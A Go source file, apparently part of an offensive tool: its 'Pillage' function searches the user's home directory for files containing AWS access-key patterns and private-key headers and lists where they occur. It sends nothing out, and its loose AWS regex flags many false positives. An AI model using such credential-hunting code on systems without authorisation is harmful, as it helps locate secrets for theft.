package attacks

import (
	"bufio"
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"strings"
)

// Finding represents a found secret in a file
type Finding struct {
	FilePath   string
	LineNo     int
	SecretType string
}

var findings []Finding

// searchKeys searches for AWS and SSH keys in the file
func searchKeys(filePath string) error {
	file, err := os.Open(filePath)
	if err != nil {
		return err // or handle it differently if you want to ignore errors
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	lineNo := 1
	for scanner.Scan() {
		line := scanner.Text()
		if matchAWSKey(line) {
			findings = append(findings, Finding{FilePath: filePath, LineNo: lineNo, SecretType: "AWS Key"})
		}
		if matchSSHKey(line) {
			findings = append(findings, Finding{FilePath: filePath, LineNo: lineNo, SecretType: "SSH Key"})
		}
		lineNo++
	}

	return scanner.Err()
}

// matchAWSKey checks if a line contains an AWS key pattern
func matchAWSKey(line string) bool {
	awsKeyPattern := regexp.MustCompile(`(AKIA[0-9A-Z]{16})|([0-9a-zA-Z/+]{40})`)
	return awsKeyPattern.MatchString(line)
}

// matchSSHKey checks if a line contains an SSH key pattern
func matchSSHKey(line string) bool {
	sshKeyPattern := regexp.MustCompile(`-----BEGIN [A-Z]+ PRIVATE KEY-----`)
	return sshKeyPattern.MatchString(line)
}

// walkFunc is called for every file visited
func walkFunc(path string, info os.FileInfo, err error) error {
	if err != nil {
		fmt.Println("Error:", err)
		return nil
	}
	if !info.IsDir() {
		err := searchKeys(path)
		if err != nil {
			fmt.Println("Error reading file:", err)
		}
	}
	return nil
}

// walkFunc is called for every file visited
func walkFuncOne(baseDir string) filepath.WalkFunc {
	return func(path string, info os.FileInfo, err error) error {
		if err != nil {
			fmt.Println("Error:", err)
			return nil
		}

		// Calculate depth
		relPath, err := filepath.Rel(baseDir, path)
		if err != nil {
			return err
		}
		depth := len(strings.Split(relPath, string(os.PathSeparator))) - 1

		// Skip if depth is greater than 1
		if depth > 1 {
			if info.IsDir() {
				return filepath.SkipDir
			}
			return nil
		}

		if !info.IsDir() {
			err := searchKeys(path)
			if err != nil {
				fmt.Println("Error reading file:", err)
			}
		}
		return nil
	}
}

func Pillage() []string {
	var findingsLine []string
	homeDir, err := os.UserHomeDir()
	if err != nil {
		fmt.Println("Error getting home directory:", err)
		return nil
	}

	err = filepath.Walk(homeDir, walkFuncOne(homeDir))
	if err != nil {
		fmt.Println("Error walking through home directory:", err)
	}

	// Process findings
	for _, finding := range findings {
		line := fmt.Sprintf("Found %s in %s at line %d\n", finding.SecretType, finding.FilePath, finding.LineNo)
		findingsLine = append(findingsLine, line)
	}
	return findingsLine
}
